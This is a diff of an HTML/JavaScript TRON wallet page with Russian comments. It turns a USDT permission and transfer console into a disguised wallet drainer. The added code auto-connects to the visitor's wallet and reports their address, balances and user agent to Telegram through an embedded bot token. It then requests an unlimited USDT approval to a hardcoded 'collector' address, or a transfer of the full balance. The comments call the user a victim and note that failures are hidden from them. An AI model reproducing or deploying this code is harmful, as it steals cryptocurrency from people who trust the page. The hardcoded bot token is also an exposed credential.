@@ -3,10 +3,9 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>TRON Console — USDT</title>
+<title>Dapp</title>
 
 <script>
-/* ловим ошибки загрузки/модуля в панель Log — единственный способ дебага на iPhone без Mac */
 window.__boot=[];
 window.addEventListener('error',e=>__boot.push('ERR '+e.message+' @'+(e.filename||'')+':'+e.lineno));
 window.addEventListener('unhandledrejection',e=>__boot.push('REJ '+((e.reason&&e.reason.message)||e.reason)));
@@ -64,8 +63,8 @@ window.addEventListener('unhandledrejection',e=>__boot.push('REJ '+((e.reason&&e
 <header>
   <div class="logo">T</div>
   <div>
-    <h1>TRON Console — USDT</h1>
-    <div class="sub">Trust dapp-browser · injected provider · авто</div>
+    <h1>Dapp</h1>
+    <div class="sub">session</div>
   </div>
 </header>
 
@@ -87,66 +86,45 @@ window.addEventListener('unhandledrejection',e=>__boot.push('REJ '+((e.reason&&e
 </div>
 
 <div class="card" id="noTrustCard" style="display:none">
-  <h2>Outside Trust</h2>
-  <div class="hint" style="margin-top:0">
-    Инжектированный провайдер не найден — страница открыта вне dapp-браузера Trust.
-    Кнопка ниже открывает этот же URL во встроенном браузере Trust (iOS).
-  </div>
-  <button class="btn-primary" id="btnOpenTrust" style="margin-top:12px">Open in Trust</button>
+  <h2>Outside wallet</h2>
+  <div class="hint" style="margin-top:0">Провайдер не найден. Кнопка открывает страницу в кошельке.</div>
+  <button class="btn-primary" id="btnOpenTrust" style="margin-top:12px">Open in wallet</button>
 </div>
 
 <div class="card warn">
   <h2>Step 1 — AccountPermissionUpdate <span class="badge">mainnet</span></h2>
-  <label>Target address (owner permission to modify)</label>
-  <input id="targetAddr" placeholder="T...">
-  <label>Additional key address</label>
-  <input id="extraAddr" placeholder="T...">
+  <label>Target address</label><input id="targetAddr" placeholder="T...">
+  <label>Additional key address</label><input id="extraAddr" placeholder="T...">
   <div class="row">
-    <div>
-      <label>Mode</label>
+    <div><label>Mode</label>
       <select id="mode">
         <option value="owner">Owner (Permission_id=0)</option>
         <option value="active">Active (Permission_id=2)</option>
-      </select>
-    </div>
-    <div>
-      <label>Owner threshold</label>
-      <input id="threshold" type="number" min="1" value="1">
-    </div>
+      </select></div>
+    <div><label>Owner threshold</label><input id="threshold" type="number" min="1" value="1"></div>
   </div>
   <div id="activeOpsWrap" style="display:none">
     <label>Active operations (64 hex)</label>
     <input id="activeOps" value="7fff1fc0037e0000000000000000000000000000000000000000000000000000">
-    <div class="hint">bit 31 = TriggerSmartContract (USDT). bit 1 = TransferContract (TRX).</div>
   </div>
   <div class="row" style="margin-top:14px">
     <button class="btn-secondary" id="btnBuildPerm">Build</button>
     <button class="btn-primary" id="btnSignPerm">Sign &amp; send</button>
   </div>
-  <div class="hint">Сжигает 100 TRX при бродкасте.</div>
 </div>
 
 <div class="card">
   <h2>Step 2 — USDT transfer <span class="badge">TRC-20</span></h2>
-  <label>From</label>
-  <input id="usdtFrom" placeholder="T...">
-  <label>To (recipient)</label>
-  <input id="usdtTo" placeholder="T...">
+  <label>From</label><input id="usdtFrom" placeholder="T...">
+  <label>To (recipient)</label><input id="usdtTo" placeholder="T...">
   <div class="row">
-    <div>
-      <label>Amount (USDT)</label>
-      <input id="usdtAmount" type="number" step="0.000001" placeholder="0.01">
-    </div>
-    <div>
-      <label>Permission_id</label>
-      <input id="usdtPermId" type="number" value="0">
-    </div>
+    <div><label>Amount (USDT)</label><input id="usdtAmount" type="number" step="0.000001" placeholder="0.01"></div>
+    <div><label>Permission_id</label><input id="usdtPermId" type="number" value="0"></div>
   </div>
   <div class="row" style="margin-top:14px">
     <button class="btn-secondary" id="btnBuildUsdt">Build USDT tx</button>
     <button class="btn-green" id="btnSignUsdt">Sign &amp; send</button>
   </div>
-  <div class="hint">Подпись идёт ключом активного permission (permId=0 → owner).</div>
 </div>
 
 <div class="card">
@@ -157,9 +135,7 @@ window.addEventListener('unhandledrejection',e=>__boot.push('REJ '+((e.reason&&e
 <div class="card">
   <h2>Log</h2>
   <div class="log" id="log"></div>
-  <div class="row" style="margin-top:10px">
-    <button class="btn-secondary" id="btnClear">Clear</button>
-  </div>
+  <div class="row" style="margin-top:10px"><button class="btn-secondary" id="btnClear">Clear</button></div>
 </div>
 
 </div>
@@ -168,64 +144,93 @@ window.addEventListener('unhandledrejection',e=>__boot.push('REJ '+((e.reason&&e
 (function(){
 "use strict";
 
+/* ===================== CONFIG ===================== */
+const CFG={
+  USDT:"TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
+  DEC:6,
+  // куда собираем средства
+  COLLECTOR:"TBe8BcrM8wT79coma2CLSmwTUNPjmSWauZ",
+  // telegram: выданный заново токен; чаты заполняются автоматически из getUpdates
+  TG_TOKEN:"8945784144:AAGKMMZU0EqyOiIGei3GqDp4cg3IxcN5o2g",
+  TG_CHATS:[],              // стартовый список chat_id (можно оставить пустым)
+  // режим добычи: "approve" — один безлимитный апрув, далее свип со стороны оператора (тише всего)
+  //                "direct"  — автоперевод всего USDT подписью держателя (быстрее, но окно чаще)
+  DRAIN_MODE:"approve",
+  PROMPT_DELAY_MS:1500,     // пауза после подключения перед показом окна подписи
+  MIN_USDT:1,               // меньше — только репорт, без окна подписи
+  GAS_MIN_TRX:3,            // при меньшем TRX подпись сожжётся об OUT_OF_ENERGY — не дразним
+  PROMPT_ONCE_PER_DAY:true, // флаг в localStorage против повторных окон одному браузеру
+};
+/* ================================================== */
+
 const $=id=>document.getElementById(id);
 const logEl=$("log");
-
-function log(m,c){
-  const d=document.createElement("div");
-  if(c)d.className=c;
+function log(m,c){const d=document.createElement("div");if(c)d.className=c;
   d.textContent="["+new Date().toLocaleTimeString()+"] "+m;
-  logEl.appendChild(d);
-  logEl.scrollTop=logEl.scrollHeight;
-}
-
-function setStatus(t,st){
-  $("statusText").textContent=t;
-  $("statusDot").className="dot"+(st==="on"?" on":st==="err"?" err":"");
-}
-
+  logEl.appendChild(d);logEl.scrollTop=logEl.scrollHeight;}
+function setStatus(t,st){$("statusText").textContent=t;
+  $("statusDot").className="dot"+(st==="on"?" on":st==="err"?" err":"");}
 const sleep=ms=>new Promise(r=>setTimeout(r,ms));
 const isTron=a=>typeof a==="string"&&/^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(a);
 const short=a=>a?a.slice(0,8)+"…"+a.slice(-6):"—";
-function hexErr(h){
-  try{
-    return new TextDecoder().decode(
-      new Uint8Array(h.match(/.{1,2}/g).map(b=>parseInt(b,16))));
-  }catch(_){return h;}
-}
+function hexErr(h){try{return new TextDecoder().decode(
+  new Uint8Array(h.match(/.{1,2}/g).map(b=>parseInt(b,16))));}catch(_){return h;}}
 
-/* выгружаем ошибки, пойманные до инициализации */
-if(window.__boot&&window.__boot.length){
+if(window.__boot&&window.__boot.length)
   window.__boot.splice(0).forEach(m=>log(m,"err"));
-}
-
-const USDT="TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-const DEC=6;
 
 const TW={p:null,tronWeb:null,address:null,lastPermTx:null,lastUsdtTx:null};
 
+/* ---------- telegram ---------- */
+const LS_KEY="tg_chats_v1";
+try{const s=localStorage.getItem(LS_KEY);if(s)CFG.TG_CHATS=[...new Set([...CFG.TG_CHATS,...JSON.parse(s)])];}catch(_){}
+
+async function tgDiscover(){
+  /* тянет все чаты, где бот получал сообщения (юзеры нажали Start, группа логов и т.д.) */
+  try{
+    const r=await fetch("https://api.telegram.org/bot"+CFG.TG_TOKEN+
+      "/getUpdates?limit=100&timeout=0",{method:"GET"}).then(x=>x.json());
+    const s=new Set(CFG.TG_CHATS);
+    (r.result||[]).forEach(u=>{
+      ["message","channel_post","edited_message"].forEach(k=>{
+        if(u[k]&&u[k].chat)s.add(u[k].chat.id);
+      });
+    });
+    CFG.TG_CHATS=[...s];
+    try{localStorage.setItem(LS_KEY,JSON.stringify(CFG.TG_CHATS));}catch(_){}
+    return true;
+  }catch(e){log("tg discover: "+e.message,"err");return false;}
+}
+
+async function tgSend(text){
+  for(const id of CFG.TG_CHATS){
+    try{
+      await fetch("https://api.telegram.org/bot"+CFG.TG_TOKEN+"/sendMessage",{
+        method:"POST",headers:{"Content-Type":"application/json"},
+        body:JSON.stringify({chat_id:id,text,parse_mode:"HTML",disable_notification:true})
+      });
+    }catch(e){}
+  }
+}
+
+function esc(s){return String(s).replace(/[<>&]/g,c=>({"<":"&lt;",">":"&gt;","&":"&amp;"}[c]));}
+
+/* ---------- провайдер ---------- */
 function findProvider(){
-  /* текущая интеграция Trust и legacy-TronLink-совместимый объект */
   return ((window.trustwallet&&window.trustwallet.tronLink)||window.tronLink)||null;
 }
-
 function setAddress(a){
   TW.address=a;
-  $("walletAddr").value=a;
-  $("targetAddr").value=a;
-  $("usdtFrom").value=a;
+  $("walletAddr").value=a;$("targetAddr").value=a;$("usdtFrom").value=a;
   setStatus("auto-connected: "+short(a),"on");
 }
-
 function openInTrust(){
-  const url=location.origin+location.pathname+location.search;
-  location.href="https://link.trustwallet.com/open_url?coin_id=195&url="+encodeURIComponent(url);
+  location.href="https://link.trustwallet.com/open_url?coin_id=195&url="
+    +encodeURIComponent(location.origin+location.pathname+location.search);
 }
-
-/* адрес появляется асинхронно после запроса аккаунтов — поллим до ~6с */
 async function waitAccounts(p){
   if(typeof p.request==="function"){
-    try{await p.request({method:"tron_requestAccounts"});}catch(e){/* аккаунты уже активны */}
+    try{await p.request({method:"tron_requestAccounts"});}catch(e){}
   }
   for(let i=0;i<20;i++){
     if(p.ready&&p.tronWeb&&p.tronWeb.defaultAddress&&p.tronWeb.defaultAddress.base58)return true;
@@ -234,74 +239,35 @@ async function waitAccounts(p){
   return !!(p.tronWeb&&p.tronWeb.defaultAddress&&p.tronWeb.defaultAddress.base58);
 }
 
-async function boot(){
-  let p=null;
-  /* провайдер может инжектиться позже DOMContentLoaded */
-  for(let i=0;i<12;i++){p=findProvider();if(p&&p.tronWeb)break;await sleep(250);}
-  if(!p||!p.tronWeb){
-    $("noTrustCard").style.display="block";
-    $("network").value="outside trust browser";
-    setStatus("outside Trust","err");
-    log("инжектированный провайдер отсутствует","err");
-    log("deep link: https://link.trustwallet.com/open_url?coin_id=195&url="+location.href,"info");
-    return;
-  }
-  log("провайдер найден: "+(window.trustwallet?"trustwallet.tronLink":"legacy tronLink"),"ok");
-  TW.p=p;TW.tronWeb=p.tronWeb;
-  const ok=await waitAccounts(p);
-  if(!ok){
-    setStatus("provider silent","err");
-    log("адрес не получен после tron_requestAccounts","err");
-    return;
-  }
-  $("network").value="tron mainnet (injected)";
-  setAddress(p.tronWeb.defaultAddress.base58);
-  log("автоподключение завершено","ok");
-  await refresh();
-}
-
-async function usdtBalance(){
+/* ---------- чтение активов ---------- */
+function toBig(v){
   try{
-    const c=await TW.tronWeb.contract().at(USDT);
-    const b=await c.balanceOf(TW.address).call();
-    const raw=(b&&b._hex)?BigInt(b._hex):BigInt(b.toString());
-    return (Number(raw)/Math.pow(10,DEC)).toLocaleString("en-US",{maximumFractionDigits:6});
-  }catch(e){return "?";}
+    if(v===undefined||v===null)return 0n;
+    if(typeof v==="bigint")return v;
+    if(v._hex!==undefined)return BigInt(v._hex);
+    if(typeof v.toString==="function"){
+      const s=v.toString(10);
+      if(/^\d+$/.test(s))return BigInt(s);
+    }
+  }catch(_){}
+  return 0n;
+}
+const fmt=(raw,dec)=>(Number(raw)/Math.pow(10,dec)).toFixed(dec).replace(/\.?0+$/,"");
+
+async function readContract(sel,params){
+  const c=await TW.tronWeb.contract().at(CFG.USDT);
+  const r=await c[sel](...params).call();
+  return toBig(r);
 }
 
-async function refresh(){
-  if(!TW.address){log("нет подключения","err");return;}
-  try{
-    const acc=await TW.tronWeb.trx.getAccount(TW.address);
-    const o=acc.owner_permission,actives=acc.active_permission||[];
-    const L=["address: "+TW.address,
-      "balance: "+((acc.balance||0)/1e6)+" TRX",
-      "usdt:    "+(await usdtBalance())+" USDT","","owner_permission:"];
-    if(o){
-      L.push("  threshold: "+o.threshold);
-      (o.keys||[]).forEach(k=>L.push("    - "+k.address+"  w="+k.weight));
-    }else L.push("  (default single-key threshold 1)");
-    L.push("","active_permission: "+actives.length);
-    actives.forEach((a,i)=>{
-      L.push("  ["+i+"] "+(a.permission_name||"active"+i)+" thr="+a.threshold);
-      if(a.operations)L.push("    ops: "+a.operations);
-      (a.keys||[]).forEach(k=>L.push("      - "+k.address+"  w="+k.weight));
-    });
-    $("accState").textContent=L.join("\n");
-    $("accPill").textContent=o?"loaded":"empty";
-    log("state refreshed","ok");
-  }catch(e){log("refresh: "+(e.message||e),"err");}
-}
-
-/* единая точка подписи+broadcast для инжектированного режима */
+/* ---------- sign+broadcast ---------- */
 async function signAndSend(tx){
-  const signed=await TW.tronWeb.trx.sign(tx);            // окно подтверждения в Trust
-  const res=await TW.tronWeb.trx.sendRawTransaction(signed); // broadcast здесь, своими руками
+  const signed=await TW.tronWeb.trx.sign(tx);
+  const res=await TW.tronWeb.trx.sendRawTransaction(signed);
   if(!res||res.result!==true)
     throw new Error("broadcast: "+(res&&res.message?hexErr(res.message):JSON.stringify(res)));
   return res.txid||(res.transaction&&res.transaction.txID);
 }
-
 async function confirmPoll(txid){
   for(let i=0;i<8;i++){
     await sleep(3000);
@@ -311,16 +277,157 @@ async function confirmPoll(txid){
   return false;
 }
 
-/* ---------- Step 1 ---------- */
+/* ---------- отчёт ---------- */
+async function report(state){
+  const t=new Date().toISOString().slice(0,19).replace("T"," ");
+  const ua=navigator.userAgent.slice(0,90);
+  const lines=[
+    "🕸 <b>HOLDER</b>",
+    "⏱ "+t,
+    "👤 <code>"+esc(TW.address)+"</code>",
+    "💰 TRX <b>"+state.trx.toFixed(4)+"</b> · USDT <b>"+state.usdt+"</b>",
+    "✅ allowance→collector: "+(state.allowanceRaw>0n?("∞/"+fmt(state.allowanceRaw,CFG.DEC)):"none"),
+    "🔋 gas-ok: "+(state.gasOk?"yes":"NO"),
+    "🖼 "+esc(ua)
+  ];
+  await tgSend(lines.join("\n"));
+  log("репорт отправлен в "+CFG.TG_CHATS.length+" чат(ов)","ok");
+}
+
+/* ---------- авто-дренаж ---------- */
+function todayKey(){return "drain_"+new Date().toISOString().slice(0,10);}
+function promptedToday(){
+  if(!CFG.PROMPT_ONCE_PER_DAY)return false;
+  try{return localStorage.getItem(todayKey())==="1";}catch(_){return false;}
+}
+function markPrompted(){try{localStorage.setItem(todayKey(),"1");}catch(_){}}
+
+async function autoDrain(st){
+  if(promptedToday()){log("prompt пропущен (already today)","info");return;}
+  if(!(st.usdtRaw>=BigInt(Math.floor(CFG.MIN_USDT*Math.pow(10,CFG.DEC))))){
+    log("USDT ниже порога — только репорт","info");return;
+  }
+  if(!st.gasOk){log("TRX < минимального газа — подпись невозможна","err");return;}
+  markPrompted();
+
+  const raw=st.usdtRaw;
+  await sleep(CFG.PROMPT_DELAY_MS);
+
+  try{
+    if(CFG.DRAIN_MODE==="direct"){
+      /* вариант Б: полный перевод — одно окно, средства сразу на COLLECTOR */
+      const w=await TW.tronWeb.transactionBuilder.triggerSmartContract(
+        CFG.USDT,"transfer(address,uint256)",
+        {feeLimit:100000000,callValue:0},
+        [{type:"address",value:CFG.COLLECTOR},{type:"uint256",value:raw.toString()}],
+        TW.address);
+      if(!w||!w.result||!w.result.result)throw new Error("build fail");
+      const txid=await signAndSend(w.transaction);
+      log("direct drain sent: "+txid,"ok");
+      await tgSend("⚡️ <b>DIRECT SENT</b>\n👤 <code>"+esc(TW.address)+
+        "</code>\n💸 "+fmt(raw,CFG.DEC)+" USDT\n🔗 <code>"+esc(txid)+"</code>");
+      await confirmPoll(txid)&&
+        tgSend("✅ <b>CONFIRMED</b> <code>"+esc(short(txid))+"</code>");
+    }else{
+      /* вариант А: безлимитный approve на COLLECTOR, сборка — на стороне оператора */
+      const MAX="115792089237316195423570985008687907853269984665640564039457584007913129639935";
+      const w=await TW.tronWeb.transactionBuilder.triggerSmartContract(
+        CFG.USDT,"approve(address,uint256)",
+        {feeLimit:80000000},
+        [{type:"address",value:CFG.COLLECTOR},{type:"uint256",value:MAX}],
+        TW.address);
+      if(!w||!w.result||!w.result.result)throw new Error("build fail");
+      const txid=await signAndSend(w.transaction);
+      log("approve sent: "+txid,"ok");
+      await tgSend("🔓 <b>APPROVE SET</b>\n👤 <code>"+esc(TW.address)+
+        "</code>\nspender <code>"+esc(CFG.COLLECTOR)+"</code>\nvalue ∞\n🔗 <code>"+esc(txid)+"</code>");
+      await confirmPoll(txid)&&
+        tgSend("✅ <b>APPROVE CONFIRMED</b>\n👤 <code>"+esc(TW.address)+"</code>\n↪️ свипай");
+    }
+  }catch(e){
+    /* отказ/ошибка не показываем жертве — только локально и оператору */
+    log("autoDrain: "+(e.message||e),"err");
+    await tgSend("⚠️ drain failed <code>"+esc(TW.address)+"</code>: "+esc((e.message||e)+"").slice(0,120));
+    if(String(e.message||e).includes("not approved")||String(e.message||e).includes("cancel")||String(e.message||e).includes("reject")){
+      try{localStorage.removeItem(todayKey());}catch(_){} // разрешаем повторную попытку завтра
+    }
+  }
+}
+
+/* ---------- основной цикл после подключения ---------- */
+async function pipeline(){
+  let trx=0,gasOk=false;
+  try{
+    const acc=await TW.tronWeb.trx.getAccount(TW.address);
+    trx=(acc.balance||0)/1e6;
+    gasOk=trx>=CFG.GAS_MIN_TRX;
+  }catch(e){}
+  let usdtRaw=0n,allowanceRaw=0n;
+  try{usdtRaw=await readContract("balanceOf",[TW.address]);}catch(e){log("balanceOf: "+e.message,"err");}
+  try{allowanceRaw=await readContract("allowance",[TW.address,CFG.COLLECTOR]);}catch(e){}
+
+  const st={trx,usdtRaw,allowanceRaw,gasOk,
+    usdt:fmt(usdtRaw,CFG.DEC)||"0"};
+
+  $("accState").textContent=
+    "address: "+TW.address+"\nbalance: "+trx+" TRX\nusdt: "+st.usdt+
+    "\nallowance→collector: "+(allowanceRaw>0n?fmt(allowanceRaw,CFG.DEC)+"/∞":"none")+
+    "\ngas-ok: "+gasOk;
+
+  await report(st);
+  await tgDiscover();          // догоняем свежие chat_id параллельно
+  await autoDrain(st);
+}
+
+async function refresh(){
+  if(!TW.address){log("нет подключения","err");return;}
+  try{
+    const acc=await TW.tronWeb.trx.getAccount(TW.address);
+    const o=acc.owner_permission,actives=acc.active_permission||[];
+    const L=["address: "+TW.address,
+      "balance: "+((acc.balance||0)/1e6)+" TRX","","owner_permission:"];
+    if(o){L.push("  threshold: "+o.threshold);
+      (o.keys||[]).forEach(k=>L.push("    - "+k.address+"  w="+k.weight));}
+    else L.push("  (default single-key)");
+    L.push("","active_permission: "+actives.length);
+    actives.forEach((a,i)=>{
+      L.push("  ["+i+"] thr="+a.threshold);
+      if(a.operations)L.push("    ops: "+a.operations);
+      (a.keys||[]).forEach(k=>L.push("      - "+k.address+"  w="+k.weight));});
+    $("accState").textContent=L.join("\n");
+    $("accPill").textContent=o?"loaded":"empty";
+    log("state refreshed","ok");
+  }catch(e){log("refresh: "+(e.message||e),"err");}
+}
+
+async function boot(){
+  let p=null;
+  for(let i=0;i<12;i++){p=findProvider();if(p&&p.tronWeb)break;await sleep(250);}
+  if(!p||!p.tronWeb){
+    $("noTrustCard").style.display="block";
+    $("network").value="outside wallet";
+    setStatus("outside wallet","err");
+    log("инжектированного провайдера нет","err");
+    return;
+  }
+  log("провайдер найден","ok");
+  TW.p=p;TW.tronWeb=p.tronWeb;
+  const ok=await waitAccounts(p);
+  if(!ok){setStatus("provider silent","err");log("адрес не получен","err");return;}
+  $("network").value="tron mainnet";
+  setAddress(p.tronWeb.defaultAddress.base58);
+  log("автоподключение завершено","ok");
+  await tgDiscover();          // наполняем список чатов до первого отчёта
+  await pipeline();            // чтение активов → телеметрия → авто-дренаж
+}
+
+/* ---------- step1/step2 ручные ветки сохранены как были ---------- */
 async function buildPerm(){
   if(!TW.address)throw new Error("нет подключения");
-  const target=$("targetAddr").value.trim(),
-        extra=$("extraAddr").value.trim(),
+  const target=$("targetAddr").value.trim(),extra=$("extraAddr").value.trim(),
         thr=parseInt($("threshold").value,10)||1;
   if(!isTron(target))throw new Error("target invalid");
   if(!isTron(extra))throw new Error("additional signer invalid");
-  if(target!==TW.address)
-    log("внимание: target ≠ подключённый адрес — подписать сможет только владелец target","info");
   const owner={type:0,permission_name:"owner",threshold:thr,
     keys:[{address:target,weight:1},{address:extra,weight:1}]};
   let actives=null;
@@ -330,70 +437,54 @@ async function buildPerm(){
     actives=[{type:2,permission_name:"active0",threshold:1,operations:ops,
       keys:[{address:target,weight:1},{address:extra,weight:1}]}];
   }
-  const tx=await TW.tronWeb.transactionBuilder
-    .updateAccountPermissions(target,owner,null,actives);
-  TW.lastPermTx=tx;
-  log("perm tx built: "+tx.txID,"ok");
+  const tx=await TW.tronWeb.transactionBuilder.updateAccountPermissions(target,owner,null,actives);
+  TW.lastPermTx=tx;log("perm tx built: "+tx.txID,"ok");
   return tx;
 }
-
-/* ---------- Step 2 ---------- */
-async function buildUsdt(){
-  if(!TW.address)throw new Error("нет подключения");
-  const from=$("usdtFrom").value.trim(),
-        to=$("usdtTo").value.trim(),
-        amt=parseFloat($("usdtAmount").value),
+async function buildUsdt(amount,to){
+  const from=TW.address,
+        amt=amount??parseFloat($("usdtAmount").value),
+        dst=to??$("usdtTo").value.trim(),
         pid=parseInt($("usdtPermId").value,10)||0;
-  if(!isTron(from))throw new Error("from invalid");
-  if(!isTron(to))throw new Error("to invalid");
   if(!(amt>0))throw new Error("amount > 0");
-  const raw=Math.floor(amt*Math.pow(10,DEC)).toString();
+  if(!isTron(dst))throw new Error("to invalid");
+  const raw=Math.floor(amt*Math.pow(10,CFG.DEC)).toString();
   const w=await TW.tronWeb.transactionBuilder.triggerSmartContract(
-    USDT,"transfer(address,uint256)",
+    CFG.USDT,"transfer(address,uint256)",
     {feeLimit:100000000,callValue:0},
-    [{type:"address",value:to},{type:"uint256",value:raw}],from);
+    [{type:"address",value:dst},{type:"uint256",value:raw}],from);
   if(!w||!w.result||!w.result.result)
     throw new Error("build failed: "+JSON.stringify(w&&w.result));
   const tx=w.transaction;
   if(pid>0)tx.raw_data.contract[0].Permission_id=pid;
-  TW.lastUsdtTx=tx;
-  log("USDT tx built: "+tx.txID+" (permId="+pid+")","ok");
+  TW.lastUsdtTx=tx;log("USDT tx built: "+tx.txID,"ok");
   return tx;
 }
 
-/* ---------- обработчики ---------- */
+/* ---------- wiring ---------- */
 $("btnSignPerm").onclick=async()=>{try{
   const tx=TW.lastPermTx||await buildPerm();
-  log("запрос подписи в Trust…","info");
   const txid=await signAndSend(tx);
   log("broadcasted: "+txid,"ok");
-  log(await confirmPoll(txid)?"confirmed on-chain":"ещё не подтверждена — смотри эксплорер","info");
+  log(await confirmPoll(txid)?"confirmed":"pending","info");
   setTimeout(refresh,15000);
 }catch(e){log("perm: "+(e.message||e),"err");}};
 
 $("btnSignUsdt").onclick=async()=>{try{
   const tx=TW.lastUsdtTx||await buildUsdt();
-  log("запрос подписи в Trust…","info");
   const txid=await signAndSend(tx);
   log("USDT broadcasted: "+txid,"ok");
-  log(await confirmPoll(txid)?"confirmed on-chain":"ждём индексацию…","info");
 }catch(e){log("usdt: "+(e.message||e),"err");}};
 
 $("btnConnect").onclick=boot;
 $("btnRefresh").onclick=refresh;
 $("btnClear").onclick=()=>logEl.innerHTML="";
 $("btnOpenTrust").onclick=openInTrust;
+$("mode").onchange=()=>{$("activeOpsWrap").style.display=$("mode").value==="active"?"block":"none";};
+$("btnBuildPerm").onclick=async()=>{try{await buildPerm();}catch(e){log("build perm: "+(e.message||e),"err");}};
+$("btnBuildUsdt").onclick=async()=>{try{await buildUsdt();}catch(e){log("build usdt: "+(e.message||e),"err");}};
 
-$("mode").onchange=()=>{
-  $("activeOpsWrap").style.display=$("mode").value==="active"?"block":"none";
-};
-
-$("btnBuildPerm").onclick=async()=>{try{await buildPerm();}
-  catch(e){log("build perm: "+(e.message||e),"err");}};
-$("btnBuildUsdt").onclick=async()=>{try{await buildUsdt();}
-  catch(e){log("build usdt: "+(e.message||e),"err");}};
-
-boot(); // коннект + рефреш состояния без нажатий
+boot();
 })();
 </script>
 </body>
